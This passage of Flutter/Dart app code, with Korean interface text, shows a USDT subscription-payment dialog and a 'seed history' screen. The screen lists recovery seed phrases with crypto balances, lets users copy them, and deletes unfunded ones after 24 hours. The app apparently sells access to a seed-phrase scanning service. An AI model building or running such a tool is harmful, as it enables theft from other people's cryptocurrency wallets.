    print('[QR] 주소 조회 ▶ ${addrResult != null ? "성공 address=${addrResult.address} invalidated=${addrResult.invalidated}" : "실패/null (token비어있음=${token.isEmpty} userId비어있음=${userId.isEmpty})"}');

    if (mounted) {
      setState(() {
        _pricing = pricing;
        _depositAddressLoading = false;
        _depositAddress = addrResult?.address;
        _depositAddressInvalidated = addrResult?.invalidated ?? false;
        _depositAddressError = addrResult == null
            ? '입금주소를 불러오지 못했습니다.\n잠시 후 다시 시도해 주세요.'
            : null;
        // 다이얼로그 열릴 때 선택 초기화 (사용자가 직접 선택하도록)
        _selectedDays = 0;
        _daysController.text = '';
      });
    }

    if (!mounted) return;

    // QR 표시 여부 (일수 선택 후에만 true)
    bool qrVisible = false;
    // 수동 확인 중 상태
    bool isManualChecking = false;

    // 다이얼로그 열리면서 백그라운드 입금 감시 시작
    _startDepositWatch();

    showDialog(
      context: context,
      builder: (ctx) {
        return StatefulBuilder(
          builder: (ctx, setDialogState) {
          final address = _depositAddress;
          final loading = _depositAddressLoading;
          final invalidated = _depositAddressInvalidated;
          final error = _depositAddressError;
          final pricingData = _pricing;

          // 현재 선택 일수 기준 금액 계산
          double calcAmount() {
            if (pricingData == null) return 0;
            final pkg = pricingData.packages
                .where((p) => p.days == _selectedDays)
                .firstOrNull;
            if (pkg != null) return pkg.price;
            return pricingData.calcPrice(_selectedDays);
          }

          const int minDays = 30;

          void updateDays(int days, StateSetter ss) {
            final clamped = days < minDays ? minDays : days;
            ss(() {
              _selectedDays = clamped;
              _daysController.text = clamped.toString();
              qrVisible = false; // 일수 바뀌면 QR 숨김 — "입금 신청" 버튼을 다시 눌러야 함
            });
          }

          return Dialog(
            backgroundColor: AppTheme.bgPanel,
            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
            child: SingleChildScrollView(
              child: Padding(
                padding: const EdgeInsets.fromLTRB(24, 24, 24, 20),
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    // 타이틀
                    const Row(
                      children: [
                        Icon(Icons.qr_code_rounded, color: AppTheme.accent, size: 22),
                        SizedBox(width: 8),
                        Text(
                          '이용기간 충전',
                          style: TextStyle(color: AppTheme.fg, fontSize: 17, fontWeight: FontWeight.w600),
                        ),
                      ],
                    ),
                    const SizedBox(height: 12),

                    // invalidated 경고 배너
                    if (invalidated) ...[
                      Container(
                        width: double.infinity,
                        padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 7),
                        decoration: BoxDecoration(
                          color: Colors.orange.withOpacity(0.15),
                          borderRadius: BorderRadius.circular(8),
                          border: Border.all(color: Colors.orange.withOpacity(0.5)),
                        ),
                        child: const Row(
                          children: [
                            Icon(Icons.warning_amber_rounded, size: 14, color: Colors.orange),
                            SizedBox(width: 6),
                            Flexible(
                              child: Text(
                                '기존 주소가 만료되어 새 주소가 발급되었습니다.',
                                style: TextStyle(color: Colors.orange, fontSize: 11),
                              ),
                            ),
                          ],
                        ),
                      ),
                      const SizedBox(height: 8),
                    ],

                    // ---------- 기간 선택 (패키지) ----------
                    if (pricingData != null && pricingData.packages.isNotEmpty) ...[
                      Align(
                        alignment: Alignment.centerLeft,
                        child: Text(
                          '기간 선택',
                          style: TextStyle(color: AppTheme.muted.withOpacity(0.7), fontSize: 11, fontWeight: FontWeight.w500),
                        ),
                      ),
                      const SizedBox(height: 6),
                      ...pricingData.packages.map((pkg) {
                        final selected = _selectedDays == pkg.days;
                        return Padding(
                          padding: const EdgeInsets.only(bottom: 6),
                          child: GestureDetector(
                            onTap: () => updateDays(pkg.days, setDialogState),
                            child: AnimatedContainer(
                              duration: const Duration(milliseconds: 140),
                              width: double.infinity,
                              padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 11),
                              decoration: BoxDecoration(
                                color: selected ? AppTheme.accent.withOpacity(0.12) : AppTheme.bgDark,
                                borderRadius: BorderRadius.circular(10),
                                border: Border.all(
                                  color: selected ? AppTheme.accent : AppTheme.muted.withOpacity(0.2),
                                  width: selected ? 1.5 : 1,
                                ),
                              ),
                              child: Row(
                                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                                children: [
                                  Row(
                                    children: [
                                      AnimatedContainer(
                                        duration: const Duration(milliseconds: 140),
                                        width: 16,
                                        height: 16,
                                        decoration: BoxDecoration(
                                          shape: BoxShape.circle,
                                          border: Border.all(
                                            color: selected ? AppTheme.accent : AppTheme.muted.withOpacity(0.4),
                                            width: selected ? 5 : 1.5,
                                          ),
                                        ),
                                      ),
                                      const SizedBox(width: 10),
                                      Text(
                                        pkg.label,
                                        style: TextStyle(
                                          color: selected ? AppTheme.accent : AppTheme.fg,
                                          fontSize: 13,
                                          fontWeight: selected ? FontWeight.w600 : FontWeight.normal,
                                        ),
                                      ),
                                    ],
                                  ),
                                  Text(
                                    '\$${pkg.price.toStringAsFixed(pkg.price % 1 == 0 ? 0 : 2)} USDT',
                                    style: TextStyle(
                                      color: selected ? AppTheme.accent : AppTheme.muted,
                                      fontSize: 13,
                                      fontWeight: selected ? FontWeight.w700 : FontWeight.normal,
                                    ),
                                  ),
                                ],
                              ),
                            ),
                          ),
                        );
                      }),
                      const SizedBox(height: 10),
                    ],

                    // ---------- 직접 입력 ----------
                    Align(
                      alignment: Alignment.centerLeft,
                      child: Text(
                        '직접 입력',
                        style: TextStyle(color: AppTheme.muted.withOpacity(0.7), fontSize: 11, fontWeight: FontWeight.w500),
                      ),
                    ),
                    const SizedBox(height: 6),
                    TextField(
                      controller: _daysController,
                      keyboardType: TextInputType.number,
                      style: const TextStyle(color: AppTheme.fg, fontSize: 14),
                      decoration: InputDecoration(
                        isDense: true,
                        contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
                        hintText: '일수를 직접 입력하세요 (최소 ${minDays}일)',
                        hintStyle: TextStyle(color: AppTheme.muted.withOpacity(0.4), fontSize: 12),
                        filled: true,
                        fillColor: AppTheme.bgDark,
                        enabledBorder: OutlineInputBorder(
                          borderRadius: BorderRadius.circular(10),
                          borderSide: BorderSide(color: AppTheme.muted.withOpacity(0.2)),
                        ),
                        focusedBorder: OutlineInputBorder(
                          borderRadius: BorderRadius.circular(10),
                          borderSide: const BorderSide(color: AppTheme.accent, width: 1.5),
                        ),
                        suffixText: '일',
                        suffixStyle: TextStyle(color: AppTheme.muted.withOpacity(0.6), fontSize: 13),
                      ),
                      onChanged: (v) {
                        final d = int.tryParse(v);
                        if (d != null && d >= minDays) {
                          setDialogState(() {
                            _selectedDays = d;
                            qrVisible = false; // 일수 바꾸면 QR 숨김 (재신청 필요)
                          });
                        }
                      },
                    ),

                    // ---------- 금액 표시 ----------
                    if (pricingData != null && _selectedDays > 0) ...[
                      const SizedBox(height: 10),
                      Container(
                        width: double.infinity,
                        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 11),
                        decoration: BoxDecoration(
                          color: AppTheme.accent.withOpacity(0.07),
                          borderRadius: BorderRadius.circular(10),
                          border: Border.all(color: AppTheme.accent.withOpacity(0.25)),
                        ),
                        child: Row(
                          mainAxisAlignment: MainAxisAlignment.spaceBetween,
                          children: [
                            Text(
                              '$_selectedDays일 이용료',
                              style: const TextStyle(color: AppTheme.muted, fontSize: 12),
                            ),
                            Text(
                              '\$${calcAmount().toStringAsFixed(2)} USDT',
                              style: const TextStyle(
                                color: AppTheme.accent,
                                fontSize: 16,
                                fontWeight: FontWeight.w700,
                              ),
                            ),
                          ],
                        ),
                      ),
                    ],

                    const SizedBox(height: 16),

                    // ── 입금 신청 버튼 (QR 미표시 상태에서만) ──
                    if (!qrVisible) ...[
                      SizedBox(
                        width: double.infinity,
                        child: ElevatedButton.icon(
                          onPressed: _selectedDays <= 0
                              ? null // 기간 미선택 시 비활성화
                              : () => setDialogState(() => qrVisible = true),
                          icon: const Icon(Icons.qr_code_rounded, size: 18),
                          label: Text(
                            _selectedDays <= 0
                                ? '기간을 먼저 선택하세요'
                                : '입금 신청  (\$${calcAmount().toStringAsFixed(2)} USDT)',
                            style: const TextStyle(fontWeight: FontWeight.w700, fontSize: 14),
                          ),
                        ),
                      ),
                      const SizedBox(height: 8),
                      TextButton(
                        // 닫아도 백그라운드 감시는 계속 실행됨
                        onPressed: () => Navigator.of(ctx).pop(),
                        child: const Text('닫기', style: TextStyle(color: AppTheme.muted)),
                      ),
                    ],

                    // ── QR + 주소 복사 (입금 신청 후) ──
                    if (qrVisible) ...[
                      const Text(
                        'TRC20 USDT 개인 입금주소로 정확한 금액을 송금하면\n자동으로 구독 기간이 연장됩니다.',
                        style: TextStyle(color: AppTheme.muted, fontSize: 11),
                        textAlign: TextAlign.center,
                      ),
                      const SizedBox(height: 12),

                      if (loading)
                        const SizedBox(
                          height: 180,
                          child: Center(child: CircularProgressIndicator(color: AppTheme.accent)),
                        )
                      else if (error != null)
                        Padding(
                          padding: const EdgeInsets.all(12),
                          child: Text(
                            error,
                            style: const TextStyle(color: AppTheme.logRed, fontSize: 12),
                            textAlign: TextAlign.center,
                          ),
                        )
                      else if (address != null && address.isNotEmpty) ...[
                        // QR 코드
                        Container(
                          padding: const EdgeInsets.all(12),
                          decoration: BoxDecoration(
                            color: Colors.white,
                            borderRadius: BorderRadius.circular(16),
                          ),
                          child: QrImageView(
                            data: address,
                            version: QrVersions.auto,
                            size: 180,
                            backgroundColor: Colors.white,
                          ),
                        ),
                        const SizedBox(height: 12),

                        // 주소 복사 버튼
                        GestureDetector(
                          onTap: () {
                            Clipboard.setData(ClipboardData(text: address));
                            ScaffoldMessenger.of(context).showSnackBar(
                              const SnackBar(
                                content: Text('입금주소가 복사되었습니다.'),
                                duration: Duration(seconds: 2),
                              ),
                            );
                          },
                          child: Container(
                            width: double.infinity,
                            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 9),
                            decoration: BoxDecoration(
                              color: AppTheme.bgDark,
                              borderRadius: BorderRadius.circular(10),
                              border: Border.all(color: AppTheme.accent.withOpacity(0.35)),
                            ),
                            child: Row(
                              mainAxisAlignment: MainAxisAlignment.center,
                              children: [
                                const Icon(Icons.copy_rounded, size: 14, color: AppTheme.accent),
                                const SizedBox(width: 6),
                                Flexible(
                                  child: Text(
                                    address,
                                    style: const TextStyle(
                                      color: AppTheme.accent,
                                      fontSize: 11,
                                      fontFamily: 'monospace',
                                    ),
                                    overflow: TextOverflow.ellipsis,
                                  ),
                                ),
                              ],
                            ),
                          ),
                        ),
                      ],

                      const SizedBox(height: 14),

                      // 자동 감지 대기 표시
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                        decoration: BoxDecoration(
                          color: AppTheme.accent.withOpacity(0.08),
                          borderRadius: BorderRadius.circular(8),
                          border: Border.all(color: AppTheme.accent.withOpacity(0.2)),
                        ),
                        child: Row(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            SizedBox(
                              width: 12, height: 12,
                              child: CircularProgressIndicator(
                                strokeWidth: 1.5,
                                color: AppTheme.accent.withOpacity(0.7),
                              ),
                            ),
                            const SizedBox(width: 8),
                            const Text(
                              '입금 자동 감지 중...',
                              style: TextStyle(color: AppTheme.muted, fontSize: 11),
                            ),
                          ],
                        ),
                      ),
                      const SizedBox(height: 8),

                      // 수동 확인 버튼
                      SizedBox(
                        width: double.infinity,
                        child: OutlinedButton.icon(
                          onPressed: isManualChecking
                              ? null
                              : () async {
                                  setDialogState(() => isManualChecking = true);
                                  final token = ServerApi.currentToken;
                                  if (token != null) {
                                    final sub = await ServerApi.getSubscriptionAsync(token);
                                    final snapMs = _depositWatchSnapshot?.millisecondsSinceEpoch ?? 0;
                                    final newMs  = sub?.expireDate?.millisecondsSinceEpoch ?? 0;
                                    if (mounted && newMs != snapMs && newMs != 0) {
                                      // 입금 감지 → 백그라운드 감시 중지 후 직접 처리
                                      _stopDepositWatch();
                                      if (ctx.mounted) Navigator.of(ctx, rootNavigator: true).pop();
                                      if (mounted) {
                                        setState(() {
                                          ServerApi.subscriptionExpiry = sub!.expireDate;
                                          _refreshExpiry();
                                        });
                                        ScaffoldMessenger.of(context).showSnackBar(
                                          SnackBar(
                                            content: Text(
                                              '✅ 입금 확인! ${sub!.remainingDays}일 이용 가능합니다.',
                                              style: const TextStyle(color: Colors.white),
                                            ),
                                            backgroundColor: AppTheme.accent.withOpacity(0.9),
                                            duration: const Duration(seconds: 5),
                                          ),
                                        );
                                      }
                                      return;
                                    }
                                  }
                                  if (mounted) setDialogState(() => isManualChecking = false);
                                  ScaffoldMessenger.of(context).showSnackBar(
                                    const SnackBar(
                                      content: Text('아직 입금이 확인되지 않았습니다. 잠시 후 다시 시도하세요.'),
                                      duration: Duration(seconds: 2),
                                    ),
                                  );
                                },
                          icon: isManualChecking
                              ? const SizedBox(
                                  width: 14, height: 14,
                                  child: CircularProgressIndicator(strokeWidth: 1.5, color: AppTheme.accent),
                                )
                              : const Icon(Icons.refresh_rounded, size: 16, color: AppTheme.accent),
                          label: Text(
                            isManualChecking ? '확인 중...' : '지금 확인',
                            style: const TextStyle(color: AppTheme.accent, fontSize: 13),
                          ),
                          style: OutlinedButton.styleFrom(
                            side: BorderSide(color: AppTheme.accent.withOpacity(0.4)),
                            padding: const EdgeInsets.symmetric(vertical: 10),
                          ),
                        ),
                      ),
                      const SizedBox(height: 6),

                      Row(
                        children: [
                          Expanded(
                            child: TextButton(
                              onPressed: () => setDialogState(() { qrVisible = false; isManualChecking = false; }),
                              child: const Text('← 기간 변경', style: TextStyle(color: AppTheme.muted, fontSize: 12)),
                            ),
                          ),
                          Expanded(
                            child: TextButton(
                              // 닫아도 백그라운드 감시는 계속 실행됨
                              onPressed: () => Navigator.of(ctx).pop(),
                              child: const Text('닫기', style: TextStyle(color: AppTheme.muted)),
                            ),
                          ),
                        ],
                      ),
                    ],
                  ],
                ),
              ),
            ),
          );
        },
        );
      },
    ); // 다이얼로그 닫혀도 _depositWatchTimer는 계속 실행 (메인 화면에서 관리)
  }

  // 잔고 수치 포맷 (최대 6자리 유효숫자)
  String _fmtBalance(double v) {
    if (v == 0) return '0';
    if (v >= 1) return v.toStringAsFixed(4).replaceAll(RegExp(r'0+$'), '').replaceAll(RegExp(r'\.$'), '');
    return v.toStringAsFixed(8).replaceAll(RegExp(r'0+$'), '').replaceAll(RegExp(r'\.$'), '');
  }

  Widget _coinChip(String label, double? val, Color color) {
    if (val == null || val <= 0) return const SizedBox.shrink();
    return Container(
      margin: const EdgeInsets.only(right: 6, top: 5),
      padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
      decoration: BoxDecoration(
        color: color.withOpacity(0.15),
        borderRadius: BorderRadius.circular(8),
        border: Border.all(color: color.withOpacity(0.45), width: 1),
      ),
      child: Text(
        '$label ${_fmtBalance(val)}',
        style: TextStyle(color: color, fontSize: 11, fontWeight: FontWeight.w700),
      ),
    );
  }

  Widget _buildHistoryCard(SeedHistoryItem item) {
    final timeStr =
        '${item.createdAt.month.toString().padLeft(2, '0')}/'
        '${item.createdAt.day.toString().padLeft(2, '0')} '
        '${item.createdAt.hour.toString().padLeft(2, '0')}:'
        '${item.createdAt.minute.toString().padLeft(2, '0')}';

    final hasAnyBalance = item.hasBalance;
    final borderColor = hasAnyBalance
        ? AppTheme.accent.withOpacity(0.55)
        : Colors.transparent;

    return Container(
      margin: const EdgeInsets.symmetric(vertical: 5, horizontal: 2),
      decoration: BoxDecoration(
        color: AppTheme.bgPanel,
        borderRadius: BorderRadius.circular(14),
        border: Border.all(color: borderColor, width: 1.2),
        boxShadow: hasAnyBalance
            ? [BoxShadow(color: AppTheme.accent.withOpacity(0.08), blurRadius: 10, spreadRadius: 1)]
            : null,
      ),
      child: Material(
        color: Colors.transparent,
        borderRadius: BorderRadius.circular(14),
        child: InkWell(
          borderRadius: BorderRadius.circular(14),
          onTap: () {
            Clipboard.setData(ClipboardData(text: item.phrase));
            ScaffoldMessenger.of(context).showSnackBar(
              const SnackBar(
                content: Text('시드 문구가 클립보드에 복사되었습니다.'),
                duration: Duration(seconds: 2),
              ),
            );
          },
          child: Padding(
            padding: const EdgeInsets.fromLTRB(14, 11, 14, 12),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                // 상단: 프리뷰 + 시간
                Row(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Expanded(
                      child: Text(
                        item.phrasePreview,
                        style: const TextStyle(
                          color: AppTheme.fg,
                          fontSize: 14,
                          fontWeight: FontWeight.w700,
                          letterSpacing: 0.2,
                        ),
                      ),
                    ),
                    const SizedBox(width: 8),
                    Text(
                      timeStr,
                      style: const TextStyle(color: AppTheme.muted, fontSize: 11),
                    ),
                  ],
                ),
                const SizedBox(height: 5),
                // 전체 시드 (작게)
                Text(
                  item.phrase,
                  maxLines: 2,
                  overflow: TextOverflow.ellipsis,
                  style: const TextStyle(color: AppTheme.muted, fontSize: 11, height: 1.4),
                ),
                // 주소
                if (item.address != null && item.address!.isNotEmpty) ...[
                  const SizedBox(height: 3),
                  Text(
                    item.address!.length > 30
                        ? '${item.address!.substring(0, 12)}…${item.address!.substring(item.address!.length - 8)}'
                        : item.address!,
                    style: const TextStyle(color: AppTheme.muted, fontSize: 10),
                  ),
                ],
                const SizedBox(height: 4),
                // 잔고 칩 or 잔고없음
                if (hasAnyBalance)
                  Wrap(
                    children: [
                      _coinChip('BTC',  item.btc,  const Color(0xFFF7931A)),
                      _coinChip('ETH',  item.eth,  const Color(0xFF627EEA)),
                      _coinChip('SOL',  item.sol,  const Color(0xFF9945FF)),
                      _coinChip('TRX',  item.trx,  const Color(0xFFEF4444)),
                      _coinChip('USDT', item.usdt, const Color(0xFF26A17B)),
                    ],
                  )
                else
                  Container(
                    margin: const EdgeInsets.only(top: 4),
                    padding: const EdgeInsets.symmetric(horizontal: 7, vertical: 2),
                    decoration: BoxDecoration(
                      color: AppTheme.muted.withOpacity(0.1),
                      borderRadius: BorderRadius.circular(6),
                    ),
                    child: const Text(
                      '잔고 없음',
                      style: TextStyle(color: AppTheme.muted, fontSize: 11),
                    ),
                  ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildHistoryBody() {
    final items = _historyItems;
    const filterLabels = ['전체', '잔고 있음', '잔고 없음'];

    return Column(
      children: [
        // 헤더
        Container(
          padding: const EdgeInsets.fromLTRB(14, 10, 14, 8),
          color: AppTheme.bgPanel,
          child: Row(
            children: [
              const Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      '시드 히스토리',
                      style: TextStyle(color: AppTheme.fg, fontSize: 14, fontWeight: FontWeight.bold),
                    ),
                    SizedBox(height: 2),
                    Text(
                      '잔고 없는 시드는 24시간 후 자동 삭제',
                      style: TextStyle(color: AppTheme.logRed, fontSize: 11),
                    ),
                  ],
                ),
              ),
              GestureDetector(
                onTap: () => _loadMoreHistory(reset: true),
                child: const Icon(Icons.refresh, color: AppTheme.muted, size: 20),
              ),
            ],
          ),
        ),
        // 필터 탭
        Container(
          color: AppTheme.bgPanel,
          padding: const EdgeInsets.fromLTRB(10, 0, 10, 8),
          child: Row(
            children: List.generate(filterLabels.length, (i) {
              final selected = _historyFilterIndex == i;
              return Expanded(
                child: GestureDetector(
                  onTap: () {
                    if (_historyFilterIndex == i) return;
                    setState(() => _historyFilterIndex = i);
                    _loadMoreHistory(reset: true);
                  },
                  child: AnimatedContainer(
                    duration: const Duration(milliseconds: 150),
                    margin: EdgeInsets.only(right: i < filterLabels.length - 1 ? 6 : 0),
                    padding: const EdgeInsets.symmetric(vertical: 7),
                    decoration: BoxDecoration(
                      color: selected ? AppTheme.accent.withOpacity(0.15) : AppTheme.bgDark,
                      borderRadius: BorderRadius.circular(8),
                      border: Border.all(
                        color: selected ? AppTheme.accent : AppTheme.muted.withOpacity(0.2),
                        width: selected ? 1.3 : 1,
                      ),
                    ),
                    child: Text(
                      filterLabels[i],
                      textAlign: TextAlign.center,
                      style: TextStyle(
                        color: selected ? AppTheme.accent : AppTheme.muted,
                        fontSize: 12,
                        fontWeight: selected ? FontWeight.w700 : FontWeight.normal,
                      ),
                    ),
                  ),
                ),
              );
            }),
          ),
        ),
        Expanded(
          child: items.isEmpty && _historyLoading
              ? const Center(child: CircularProgressIndicator())
              : items.isEmpty
                  ? Center(
                      child: Column(
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          const Icon(Icons.history, color: AppTheme.muted, size: 40),
                          const SizedBox(height: 10),
                          Text(
                            _historyError ?? '아직 전송된 시드가 없습니다.',
                            style: const TextStyle(color: AppTheme.muted),
                          ),
                        ],
                      ),
                    )
                  : RefreshIndicator(
                      onRefresh: () => _loadMoreHistory(reset: true),
                      color: AppTheme.accent,
                      child: ListView.builder(
                        controller: _historyScrollController,
                        padding: const EdgeInsets.fromLTRB(10, 8, 10, 16),
                        itemCount: items.length + (_historyHasNext || _historyLoading ? 1 : 0),
                        itemBuilder: (context, index) {
                          if (index >= items.length) {
                            // 푸터: 로딩 중이면 스피너, 아니면 '더 보기' 버튼
                            if (_historyLoading) {
                              return const Padding(
                                padding: EdgeInsets.symmetric(vertical: 16),
                                child: Center(child: CircularProgressIndicator(strokeWidth: 2)),
                              );
                            }
                            return Padding(
                              padding: const EdgeInsets.symmetric(vertical: 10),
                              child: TextButton(
                                onPressed: _loadMoreHistory,
                                child: const Text(
                                  '더 보기',
                                  style: TextStyle(color: AppTheme.accent),
                                ),
                              ),
                            );
                          }
                          return _buildHistoryCard(items[index]);
                        },
                      ),
                    ),
        ),
      ],
    );
  }
}
